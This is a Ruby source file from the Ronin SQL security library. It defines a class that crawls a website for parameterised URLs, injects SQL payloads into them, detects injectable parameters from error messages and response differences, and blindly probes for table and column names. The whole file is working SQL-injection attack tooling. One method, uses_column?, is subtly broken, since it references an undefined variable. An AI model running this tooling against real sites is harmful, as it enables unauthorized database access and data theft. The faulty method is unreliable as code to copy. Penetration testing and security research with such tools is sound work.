#
#--
# Ronin SQL - A Ronin library providing support for SQL related security
# tasks.
#
# Copyright (c) 2007-2009 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#++
#

require 'ronin/sql/error'
require 'ronin/code/sql/injection'
require 'ronin/sessions/http'
require 'ronin/extensions/uri'
require 'ronin/web/extensions/nokogiri'
require 'ronin/web/spider'

require 'nokogiri'

module Ronin
  module SQL
    class Injection

      include Sessions::HTTP

      # The URL to inject upon
      attr_reader :url

      # The URL query param to inject into
      attr_reader :param

      # Options for crafting SQL injections
      attr_reader :sql_options

      # HTTP request method (either :get or :post)
      parameter :http_method,
                :default => :get,
                :description => 'HTTP request method to use'

      #
      # Creates a new Injection object with the specified _url_, _param_
      # to inject upon and the given _options_ which will be used
      # for crafting SQL injections.
      #
      def initialize(url,param,options={})
        super()

        @url = url
        @param = param
        @sql_options = options
      end

      #
      # Spider a site starting at the specified _url_ using the given
      # _options_ and return an Array of URLs which are vulnerable to SQL
      # Injection. If a _block_ is given, it will be passed vulnerable SQL
      # Injection objects as they are found.
      #
      #   Injection.spider('http://www.target.com/contact/')
      #   # => [...]
      #
      #   Injection.spider('http://www.target.com/') do |injection|
      #     ...
      #   end
      #
      def Injection.spider(url,options={},&block)
        injections = []

        Web::Spider.site(url,options) do |spider|
          spider.every_url_like(/\?[a-zA-Z0-9_]/) do |vuln_url|
            found = vuln_url.sql_injections

            found.each(&block) if block
            injections += found
          end
        end

        return injections
      end

      #
      # Creates a new Code::SQL::Injection object using the given _options_
      # and _block_. The given _options_ will be merged with the injections
      # sql_options, to create a tailored Code::SQL::Injection object.
      #
      def sql(options={},&block)
        Code::SQL::Injection.new(@sql_options.merge(options),&block)
      end

      def inject(options={},&block)
        injection = (options[:sql] || sql(options,&block))

        injection_url = URI(@url.to_s)
        injection_url.query_params[@param.to_s] = injection

        request_method = (options[:method] || @http_method)
        options = options.merge(:url => injection_url)

        if request_method == :post
          return http_post_body(options)
        else
          return http_get_body(options)
        end
      end

      def inject_error(options={})
        inject({:sql => "'"}.merge(options))
      end

      def error(options={})
        inject_error(options).sql_error
      end

      def has_error?(options={})
        Error.has_message?(inject_error(options))
      end

      def vulnerable?(options={})
        body1 = inject(options) { no_rows }
        body2 = inject(options) { all_rows }

        if (body1.sql_error? || body2.sql_error?)
          return false
        end

        body1 = Nokogiri::HTML(body1)
        body2 = Nokogiri::HTML(body2)

        return body1.total_children < body2.total_children
      end

      def has_column?(column,options={})
        body1 = inject(options)
        body2 = inject(options.merge(:symbols => {:column => column})) do
          has_column?(column)
        end

        if (body1.sql_error? || body2.sql_error?)
          return false
        end

        body1 = Nokogiri::HTML(body1)
        body2 = Nokogiri::HTML(body2)

        return body1.total_children == body2.total_children
      end

      def has_table?(table,options={})
        body1 = inject(options)
        body2 = inject(options.merge(:symbols => {:table => table})) do
          has_table?(table)
        end

        if (body1.sql_error? || body2.sql_error?)
          return false
        end

        body1 = Nokogiri::HTML(body1)
        body2 = Nokogiri::HTML(body2)

        return body1.total_children == body2.total_children
      end

      def uses_column?(column,options={})
        body1 = inject(options)
        body2 = inject(options.merge(:symbols => {:column => column})) do
          uses_column?(table)
        end

        if (body1.sql_error? || body2.sql_error?)
          return false
        end

        body1 = Nokogiri::HTML(body1)
        body2 = Nokogiri::HTML(body2)

        return body1.total_children == body2.total_children
      end

      def uses_table?(table,options={})
        body1 = inject(options)
        body2 = inject(options.merge(:symbols => {:table => table})) do
          uses_table?(table)
        end

        if (body1.sql_error? || body2.sql_error?)
          return false
        end

        body1 = Nokogiri::HTML(body1)
        body2 = Nokogiri::HTML(body2)

        return body1.total_children == body2.total_children
      end

      def to_s
        @url.to_s
      end

    end
  end
end
